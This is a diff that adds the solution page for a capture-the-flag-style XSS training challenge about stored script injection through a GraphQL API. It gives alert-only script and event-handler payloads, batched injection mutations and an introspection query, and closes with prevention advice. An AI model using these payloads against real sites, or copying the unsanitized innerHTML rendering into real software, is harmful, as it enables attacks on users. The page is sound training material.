@@ -1,0 +1,213 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 19 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 19 Solution: XSS in GraphQL APIs</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how GraphQL APIs can be vulnerable to XSS attacks if the client application doesn't properly sanitize data received from the API. The GraphQL Explorer application allows users to create product reviews through a GraphQL API, but has a vulnerability in how it renders review content.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to exploit the vulnerable review rendering mechanism by injecting JavaScript code that will be stored via a GraphQL mutation and executed when the review is viewed.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>The vulnerability lies in how the application renders review content received from the GraphQL API. Looking at the code, we can see that it uses innerHTML to render the review content without any sanitization:</p>
+                        <pre class="bg-light p-3 rounded"><code>function renderReview(review) {
+    const stars = '★'.repeat(review.rating) + '☆'.repeat(5 - review.rating);
+    
+    return `
+        &lt;div class="card mb-3"&gt;
+            &lt;div class="card-body"&gt;
+                &lt;div class="d-flex justify-content-between align-items-center mb-2"&gt;
+                    &lt;h6 class="mb-0"&gt;${review.author}&lt;/h6&gt;
+                    &lt;span class="text-warning"&gt;${stars}&lt;/span&gt;
+                &lt;/div&gt;
+                &lt;div class="review-content mb-2"&gt;
+                    &lt;!-- This is the vulnerable part - it uses innerHTML to render the review content --&gt;
+                    &lt;div&gt;${review.content}&lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class="text-muted small"&gt;
+                    &lt;i class="bi bi-calendar me-1"&gt;&lt;/i&gt;${review.date}
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    `;
+}</code></pre>
+                        <p>This means that any HTML or JavaScript in the review content will be executed when the review is rendered. The application also doesn't properly sanitize the review content when it's submitted through the GraphQL mutation, allowing attackers to inject malicious code.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Crafting the Payload</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit this vulnerability, we need to craft a payload that will be stored in the review content and executed when the review is rendered. Here are several approaches:</p>
+                        
+                        <h6>Method 1: Basic Script Tag</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script&gt;alert("XSS Level 19 Completed!")&lt;/script&gt;</code></pre>
+                        <p>This is the simplest approach, using a script tag to execute JavaScript when the review is rendered.</p>
+                        
+                        <h6>Method 2: Event Handler</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;img src="x" onerror="alert('XSS Level 19 Completed!')"&gt;</code></pre>
+                        <p>This payload uses an image with an invalid source, triggering the onerror event handler which executes our JavaScript.</p>
+                        
+                        <h6>Method 3: Inline JavaScript</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;div onmouseover="alert('XSS Level 19 Completed!')"&gt;Hover over me to trigger the XSS&lt;/div&gt;</code></pre>
+                        <p>This payload creates a div with an onmouseover event handler that executes our JavaScript when the user hovers over it.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step-by-Step Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>
+                                <p>Open the GraphQL Explorer application and select a product from the list on the left.</p>
+                            </li>
+                            <li>
+                                <p>Scroll down to the "Add Your Review" form.</p>
+                            </li>
+                            <li>
+                                <p>Enter your name in the "Your Name" field.</p>
+                            </li>
+                            <li>
+                                <p>Select a rating from the dropdown.</p>
+                            </li>
+                            <li>
+                                <p>In the "Review" textarea, enter one of the XSS payloads:</p>
+                                <pre class="bg-light p-3 rounded"><code>&lt;script&gt;alert("XSS Level 19 Completed!")&lt;/script&gt;</code></pre>
+                            </li>
+                            <li>
+                                <p>Click the "Submit Review" button to submit the review with the XSS payload.</p>
+                            </li>
+                            <li>
+                                <p>The review will be submitted via a GraphQL mutation and then displayed in the reviews list.</p>
+                            </li>
+                            <li>
+                                <p>When the review is rendered, the XSS payload will be executed, displaying the alert message "XSS Level 19 Completed!".</p>
+                            </li>
+                            <li>
+                                <p>When the alert appears, the challenge will be solved and the flag will be revealed.</p>
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>GraphQL-Specific Exploitation Techniques</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>In a real GraphQL API, there are additional exploitation techniques that could be used:</p>
+                        
+                        <h6>1. Exploiting GraphQL Introspection</h6>
+                        <pre class="bg-light p-3 rounded"><code>query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+          kind
+        }
+      }
+    }
+  }
+}</code></pre>
+                        <p>This query uses GraphQL's introspection feature to reveal the entire API schema, which could help attackers identify additional attack vectors.</p>
+                        
+                        <h6>2. Nested Object Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>mutation {
+  createReview(
+    productId: 1,
+    author: "Attacker",
+    rating: 5,
+    content: "{\"__proto__\": {\"toString\": \"() => { alert('XSS Level 19 Completed!'); return ''; }\"}}"
+  ) {
+    id
+  }
+}</code></pre>
+                        <p>This payload attempts to exploit prototype pollution in the GraphQL resolver by injecting a malicious object.</p>
+                        
+                        <h6>3. Batch Queries/Mutations</h6>
+                        <pre class="bg-light p-3 rounded"><code>[
+  {
+    "query": "mutation { createReview(productId: 1, author: \"Attacker\", rating: 5, content: \"<script>alert('XSS Level 19 Completed!')</script>\") { id } }"
+  },
+  {
+    "query": "mutation { createReview(productId: 1, author: \"Attacker\", rating: 5, content: \"<img src=x onerror=alert('XSS Level 19 Completed!')>\") { id } }"
+  }
+]</code></pre>
+                        <p>This payload uses GraphQL's batch query feature to submit multiple XSS payloads in a single request, increasing the chance of success.</p>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Unsafe Content Rendering:</strong> The application renders user-supplied content using innerHTML without sanitization, allowing XSS attacks.</li>
+                            <li><strong>Insufficient Input Validation:</strong> The GraphQL API doesn't properly validate or sanitize user input before storing it.</li>
+                            <li><strong>Client-Side Security Reliance:</strong> The application relies solely on client-side security measures, which can be bypassed.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Content Sanitization:</strong> Always sanitize user-supplied content before rendering it in the DOM. Use libraries like DOMPurify to remove potentially malicious content.</li>
+                            <li><strong>Safe DOM Manipulation:</strong> Use <code>textContent</code> instead of <code>innerHTML</code> when rendering user-supplied content, or use a framework that automatically escapes HTML.</li>
+                            <li><strong>Input Validation:</strong> Validate all user input on both the client and server side to prevent malicious data from being stored in the first place.</li>
+                            <li><strong>GraphQL-Specific Protections:</strong>
+                                <ul>
+                                    <li>Disable or limit introspection in production environments</li>
+                                    <li>Implement proper authorization checks for all GraphQL operations</li>
+                                    <li>Use query complexity analysis to prevent resource-intensive queries</li>
+                                    <li>Set up rate limiting for GraphQL operations</li>
+                                    <li>Validate and sanitize all input arguments in resolvers</li>
+                                </ul>
+                            </li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to mitigate the impact of XSS vulnerabilities.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            GraphQL APIs are becoming increasingly popular due to their flexibility and efficiency. However, this flexibility can introduce new security challenges. In real-world scenarios, XSS vulnerabilities in GraphQL applications can be particularly dangerous because:
+                        </p>
+                        <ul>
+                            <li>GraphQL provides detailed error messages that can leak sensitive information</li>
+                            <li>The flexible nature of GraphQL queries can lead to unexpected data exposure</li>
+                            <li>GraphQL APIs often have complex authorization logic that can be bypassed</li>
+                            <li>Client applications may not properly sanitize data received from GraphQL APIs</li>
+                            <li>GraphQL introspection can reveal the entire API schema to attackers</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level19') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
